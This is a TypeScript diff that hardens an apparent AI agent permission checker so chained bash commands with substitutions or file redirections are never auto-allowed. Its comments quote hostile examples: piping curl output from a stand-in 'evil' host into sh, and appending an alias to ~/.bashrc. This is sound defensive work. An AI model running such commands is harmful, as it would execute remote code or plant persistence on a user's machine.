@@ -1,3 +1,4 @@
+import { FILE_REDIRECT_OPS, lexShell, renderSegment, splitShellSegments } from "./shell";
 import type { PermissionRequest } from "./types";
 
 export interface AllowRule {
@@ -32,16 +33,25 @@ export function matchAllowRule(rule: AllowRule, req: PermissionRequest): boolean
 }
 
 // Splits a bash command into its chained segments ("a && b | c; d" →
-// ["a", "b", "c", "d"]) with a plain separator scan — quotes are not honored,
-// which only ever errs towards asking. Returns null when the command embeds a
-// command substitution ("$(...)" or backticks): the segments can no longer be
-// trusted because a substitution hides an arbitrary command in a benign one.
+// ["a", "b", "c", "d"]) using the shell lexer, so separators inside quotes
+// don't split and backgrounded commands ("a & b") split like any other chain.
+// Returns null — no segment can be trusted — when the command embeds a
+// command substitution ("$(...)" or backticks, which hide an arbitrary
+// command in a benign one) or any segment writes/reads a file through an
+// unquoted redirection (">", ">>", "<") or process substitution (">(...)",
+// "<(...)"): `echo 'alias x=...' >> ~/.bashrc` must not sail through on
+// bash(echo *). Fd duplication (2>&1) stays allow-eligible.
 function splitCommandChain(command: string): string[] | null {
   if (command.includes("$(") || command.includes("`")) return null;
-  return command
-    .split(/&&|\|\||[;|\n]/)
-    .map((segment) => segment.trim())
-    .filter((segment) => segment.length > 0);
+  const tokens = lexShell(command);
+  if (tokens.some((token) => token.kind === "subst")) return null;
+  const segments = splitShellSegments(tokens);
+  for (const segment of segments) {
+    if (segment.some((token) => token.kind === "op" && FILE_REDIRECT_OPS.has(token.op))) {
+      return null;
+    }
+  }
+  return segments.map(renderSegment).filter((segment) => segment.length > 0);
 }
 
 function withCommand(req: PermissionRequest, command: string): PermissionRequest {
@@ -53,7 +63,7 @@ function withCommand(req: PermissionRequest, command: string): PermissionRequest
 
 // Allow rules apply per chain segment: "bash(git *)" must not wave through
 // "git status && curl evil | sh". Every segment has to match some rule, and a
-// command with a substitution is never auto-allowed.
+// command with a substitution or a file redirection is never auto-allowed.
 export function isAllowedByRules(rules: readonly string[], req: PermissionRequest): boolean {
   if (req.toolName !== "bash") return matchesAnyRule(rules, req);
   const command = requestTarget(req);
